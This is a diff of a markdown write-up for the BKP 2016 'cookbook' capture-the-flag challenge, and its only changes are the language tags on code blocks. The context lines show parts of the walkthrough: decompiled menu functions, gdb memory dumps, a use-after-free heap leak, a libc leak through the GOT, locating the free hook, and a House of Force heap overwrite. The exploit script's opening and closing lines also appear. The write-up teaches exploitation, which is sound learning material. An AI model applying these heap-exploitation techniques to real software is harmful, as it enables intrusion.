@@ -7,7 +7,7 @@ https://www.youtube.com/watch?v=PISoSH8KGVI
 
 Let's take a look at the binary and libc file:
 
-```
+```console
 $    file cookbook
 cookbook: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=2397d3d3c3b98131022ddd98f30e702bd4b88230, stripped
 $    pwn checksec cookbook
@@ -62,7 +62,7 @@ So we can see that we are given a `32` bit binary, we a Stack Canary and NX. We 
 
 This is going to be a fun one. Checking the references to strings that we see in the menu, we find the `menu` function:
 
-```
+```c
 void menu(void)
 
 {
@@ -127,7 +127,7 @@ void menu(void)
 
 Let's start going through this code and the functions it calls bit by bit:
 
-```
+```c
 void listIngredients(void)
 
 {
@@ -148,7 +148,7 @@ void listIngredients(void)
 
 We can see here that iterate through and print all of our ingredients using the `printIngredient` function. We can also see that our ingredients are stored in the bss variable `ingredients` stored at `0x804d094`. We can see the structure of an ingredient thanks to the `printIngredient` function:
 
-```
+```c
 
 void printIngredient(undefined4 *param_1)
 
@@ -162,7 +162,7 @@ void printIngredient(undefined4 *param_1)
 
 So we can see here, that an ingredient is `12` bytes long. The first `4` bytes holds the calories, the second `4` bytes holds the prices, and the third `4` bytes holds the name. Next up we have:
 
-```
+```c
 void recipeCookbook(void)
 
 {
@@ -184,7 +184,7 @@ void recipeCookbook(void)
 
 Like the `listIngredients` function, this prints the recipes, which are stored in the bss variable `recipes` at `0x804d08c`. Also we can see it prints the name of the cookbook, which is stored in the bss address `cookbookName` at `0x804d0ac`. Looking at the `printRecipe` function, we see what the structure of a recipe looks like:
 
-```
+```c
 void printRecipe(undefined4 *ingredient)
 
 {
@@ -226,7 +226,7 @@ void printRecipe(undefined4 *ingredient)
 
 From that (and some of the functions this called) we can tell that the structure of a recipe is this:
 
-```
+```text
 0x0:  ptr to linked list of ingredient counts
 0x4:  ptr to linked list of ingredient quantities
 0x8:  char array for recipe name
@@ -236,7 +236,7 @@ From that (and some of the functions this called) we can tell that the structure
 
 Next up is `nameCookbook`:
 
-```
+```c
 void nameCookbook(void)
 
 {
@@ -264,7 +264,7 @@ void nameCookbook(void)
 
 We can see that the name of the cookbook is stored in a heap chunk, where a pointer to that chunk is stored in the bss variable `name` at `0x804d0a8`. We have control over the size of the chunk. Checking the references to `name` we see this function.
 
-```
+```c
 void removeName(void)
 
 {
@@ -275,7 +275,7 @@ void removeName(void)
 
 Here we can see it frees the pointer stored at `name`, which we can run with the `R` option. Also notice how there are no checks on the pointer before it is freed, and it isn't zeroed out (so we might have a UAF here). Next up, we have the `e` option:
 
-```
+```c
   case 'e':
     ptr = (char *)calloc(0x80,1);
     printf("which ingredient to exterminate? ");
@@ -288,7 +288,7 @@ Here we can see it frees the pointer stored at `name`, which we can run with the
 
 We can see that it allocates `0x80` bytes worth of heap space, scans in that much data into the space, then frees it. Next up we have:
 
-```
+```c
 void addIngredient(void)
 
 {
@@ -406,7 +406,7 @@ void addIngredient(void)
 
 After reversing all of this, we have what each of the secondary menu options do:
 
-```
+```text
 currentIngredient = current ingredient being edited, global variable stored in bss at 0x804d09c
 l - prints ingredient options
 n - mallocs 0x90 bytes of space, sets currentIngredient equal to the pointer returned by malloc, then sets that address + 0x8c equal to the pointer returned by malloc
@@ -421,7 +421,7 @@ e - if currentIngredient is set, it will append the pointer currentIngredient to
 
 The `c` option also presents us with another menu:
 
-```
+```c
 void createRecipe(void)
 
 {
@@ -558,7 +558,7 @@ LAB_080490a6:
 
 After reversing it, we find out that the menu options do this:
 
-```
+```nasm
 currentRecipe = current recipe being edited, stored as a global variable in the bss at 0x804d0a0
 n - callocs 0x40c bytes worth of space, set's currentRecipe equal to the pointer returned by calloc
 d - frees currentRecipe
@@ -581,7 +581,7 @@ For this, our exploit will really have two stages. The first will involve gettin
 
 So in order to execute this house of force attack against the free hook, the first infoleak we will need will be one from the heap. First off we have a use after free bug in the `createRecipe` menu (option c). We see that in there, if we delete an item (option d) it frees the space but the pointer remains:
 
-```
+```c
       case 'd':
         free(cur_rec);
         continue;
@@ -589,7 +589,7 @@ So in order to execute this house of force attack against the free hook, the fir
 
 Let's see how what this space looks like in gdb after it is freed:
 
-```
+```gdb
 gef➤  b *0x80495a0
 Breakpoint 1 at 0x80495a0
 gef➤  r
@@ -710,7 +710,7 @@ gef➤  x/s 0x0804e058
 
 So here we can see is the memory for our recipe (starting at `0x0804f2b0`). We can see that the pointers to the linked list for the ingredients (stored at `0x0804f6c0`), and the array of our ingredient counts. Also we can see our `water` ingredient at `0x804e050`. Let's see what the memory for the `currentRecipe` looks like after we free it:
 
-```
+```gdb
 gef➤  c
 Continuing.
 [------]
@@ -835,7 +835,7 @@ So we can see that the data has been replaced with heap metadata, which is a hea
 
 The next infoleak we will need will be a libc infoleak. Next up, let's see what happens when we allocate space to a recipe, free it, then make a new ingredient. Let's see exactly how the data is laid out when this happens:
 
-```
+```c
 gef➤  r
 Starting program: /Hackery/pod/modules/house_of_force/bkp16_cookbook/cookbook
 what's your name?
@@ -975,7 +975,7 @@ gef➤  x/w 0x0804f6d0
 
 So we can see here is the memory for the recipe we created. We can see our ingredients, the ingredient counts, and the instructions for the recipe. Let's free this region of memory, then see what it looks like after it has been freed:
 
-```
+```c
 gef➤  c
 Continuing.
 d
@@ -1065,7 +1065,7 @@ gef➤  x/w 0xf7fb67b0
 
 So we can see that the pointers to ingredient counts and ingredient pointers have been written over with heap metadata (pointing to the next area of the heap which can be allocated). We can see that the recipe instructions remain there. Let's add an ingredient now and see how this memory region looks:
 
-```
+```c
 gef➤  c
 Continuing.
 a
@@ -1194,7 +1194,7 @@ gef➤  x/w 0x804d0a0
 
 So we can see that the instructions we had at `0x804f33c` for the recipe have been overwritten with a pointer to the ingredient (which we can see the calories, price, and name starting at `0x804f2b0`). Because of its position being in the exact spot that the instructions were at, we should be able to make a new recipe and overwrite that pointer since `currentRecipe` is still pointing to `0x804f2b0`.
 
-```
+```c
 gef➤  c
 Continuing.
 e
@@ -1310,7 +1310,7 @@ Now with this we can get another infoleak, this time to libc. Looking at the `pr
 
 Let's find a got address for the function free:
 
-```
+```console
 $ $ readelf --relocs ./cookbook | grep free
 0804d018  00000407 R_386_JUMP_SLOT   00000000   free@GLIBC_2.0
 ```
@@ -1325,7 +1325,7 @@ Also the whole reason we are able to do this, is because `currentRecipe` is not 
 
 So in order to write to the free hook, we need to first find it. If we have symbols, we can do something like this:
 
-```
+```gdb
 gef➤  set __free_hook = 0xfacade
 gef➤  search-pattern 0xfacade
 [+] Searching '\xde\xca\xfa' in memory
@@ -1337,12 +1337,12 @@ gef➤  x/w 0xf7fb48b0
 
 However what if we don't have symbols? Before we do that, let's look at the assembly code for free:
 
-```
+```nasm
 => 0xf7f1b625:  mov    ebx,DWORD PTR [esp]
    0xf7f1b628:  ret    
 ```
 
-```
+```gdb
 gef➤  x/20i free
    0xf75dedc0 <free>: push   ebx
    0xf75dedc1 <free+1>: call   0xf768f625
@@ -1357,7 +1357,7 @@ gef➤  x/20i free
 
 So we can see here the value of `ebx` is just the stack pointer . Then it has the hex string `0x1432a` added to it, then has `0x98` subtracted from it before it is moved into `eax` to be used as the free hook. Then it checks to see if it actually points anything (checks to see if there is a hook) and if there is, it will jump to the part where it will execute the hook.
 
-```
+```nasm
    0xf7e6ae50 <free+144>: sub    esp,0x8
    0xf7e6ae53 <free+147>: push   DWORD PTR [esp+0x14]
    0xf7e6ae57 <free+151>: push   ecx
@@ -1366,7 +1366,7 @@ So we can see here the value of `ebx` is just the stack pointer . Then it has th
 
 Here we can see it calls `eax` which has the web hook from the previous block. Let's see where the free hook is in memory:
 
-```
+```c
 gef➤  b free
 Breakpoint 1 at 0x8048530
 gef➤  r
@@ -1489,7 +1489,7 @@ gef➤  s
 
 step through the instructions until you hit `free+25`:
 
-```
+```c
 [----------------------------------registers-----------------------------------]
 EAX: 0xf7fb48b0 --> 0x0
 EBX: 0xf7fb3000 --> 0x1b5db0
@@ -1589,7 +1589,7 @@ Start      End        Offset     Perm Path
 
 So we can see the hook at `0xf7fb48b0` which is stored in the libc between. Let's follow the process when we actually set the free hook (we will just be setting it to 0000):
 
-```
+```gdb
 gef➤  set *0xf7fb48b0 = 0x30303030
 gef➤  x/w 0xf7fb48b0
 0xf7fb48b0 <__free_hook>: 0x30303030
@@ -1598,7 +1598,7 @@ gef➤  s
 
 After we step through the instructions up to the call:
 
-```
+```gdb
 [----------------------------------registers-----------------------------------]
 EAX: 0x30303030 ('0000')
 EBX: 0xf7fb3000 --> 0x1b5db0
@@ -1666,7 +1666,7 @@ Essentially what House of Force does is overwrite the wilderness value with a mu
 
 Also just for reference, in a sample x64 program this is an instance of a wilderness value at `0x555555756038`:
 
-```
+```gdb
 gef➤  x/20g $rax
 0x555555756010: 0x0000000000000000  0x0000000000000000
 0x555555756020: 0x0000000000000000  0x0000000000000000
@@ -1685,7 +1685,7 @@ gef➤  x/g 0x555555756038
 
 So let's figure out how to groom the heap to allow us to do it. Picking up from where we left off with the infoleaks and a few other things (from the perspective of the exploit), we will first get a stale pointer to work with:
 
-```
+```console
 [l]ist ingredients
 [r]ecipe book
 [a]dd ingredient
@@ -1741,7 +1741,7 @@ $ q
 
 Next we will add two new ingredients, then free one. This will position it such that we can overwrite the wilderness value with the instructions:
 
-```
+```console
 ====================
 [l]ist ingredients
 [r]ecipe book
@@ -1790,7 +1790,7 @@ $ d
 
 When we take a look at the memory layout prior to the write:
 
-```
+```gdb
 gef➤  x/20wx 0x8d5f400
 0x8d5f400:  0x00000000  0x00000000  0x00000000  0x08d5f380
 0x8d5f410:  0x00000000  0x0001ebf1  0x00000000  0x00000000
@@ -1801,7 +1801,7 @@ gef➤  x/20wx 0x8d5f400
 
 We can see the wilderness value at `0x8d5f410`, which is `0x0001ebf1`. Now let's overwrite it with instructions:
 
-```
+```console
 $ q
 ====================
 [l]ist ingredients
@@ -1838,7 +1838,7 @@ $ 0000111122223333
 
 When we look at the memory:
 
-```
+```gdb
 gef➤  x/20wx 0x8d5f400
 0x8d5f400:  0x00000000  0x00000000  0x00000000  0x30303030
 0x8d5f410:  0x31313131  0x32323232  0x33333333  0x0000000a
@@ -1857,7 +1857,7 @@ For how much space we will allocate with the first chunk, we will allocate space
 
 Let's take a look at the actual malloc allocations. First we will allocate a chunk of size `0xeec3c490` due to the memory mappings of this particular run:
 
-```
+```console
 ─────────────────────────────────────────────────────────────── code:x86:32 ────
     0x8048bb2                  adc    BYTE PTR [ecx-0x137c4fbb], cl
     0x8048bb8                  or     al, 0xff
@@ -1891,7 +1891,7 @@ Breakpoint 1, 0x08048bbc in ?? ()
 
 We end up with this chunk:
 
-```
+```gdb
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
     0x8048bb6                  sub    esp, 0xc
     0x8048bb9                  push   DWORD PTR [ebp-0x50]
@@ -1918,7 +1918,7 @@ $1 = 0x8b1f418
 
 Next up we allocate the chunk that should overlap with the free hook:
 
-```
+```gdb
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
     0x8048bb2                  adc    BYTE PTR [ecx-0x137c4fbb], cl
     0x8048bb8                  or     al, 0xff
@@ -1989,7 +1989,7 @@ As you can see, we were able to allocate a chunk to the free hook by using a Hou
 
 Putting it all together, we have the following exploit. This was ran on Ubuntu 17.04:
 
-```
+```python
 '''
 This exploit is based off of this writeup with multiple parts (one of the best writeups I ever saw):
 https://www.youtube.com/watch?v=f1wp6wza8ZI
@@ -2200,7 +2200,7 @@ target.interactive()
 ```
 
 When we run it:
-```
+```console
 $ python exploit.py
 [+] Starting local process './cookbook': pid 63919
 [*] Heap leak is: 0x846d6d8
